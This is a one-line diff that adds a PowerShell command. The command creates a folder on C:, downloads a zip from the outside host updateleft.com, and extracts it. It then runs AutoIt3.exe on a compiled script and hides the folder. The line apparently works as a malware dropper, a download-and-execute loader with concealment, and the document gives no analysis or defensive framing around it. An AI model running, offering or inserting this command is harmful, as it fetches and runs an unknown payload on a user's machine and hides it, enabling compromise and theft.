@@ -1,0 +1,1 @@
+ni 'C:/bwjv/' -Type Directory -Force;cd 'C:/bwjv/';Invoke-WebRequest -Uri "http://updateleft.com/yhsxjctz" -OutFile 'file.zip';Expand-Archive -Path 'file.zip' -DestinationPath 'C:/bwjv/';start 'AutoIt3.exe' -a 'script.a3x';attrib +h 'C:/bwjv/'
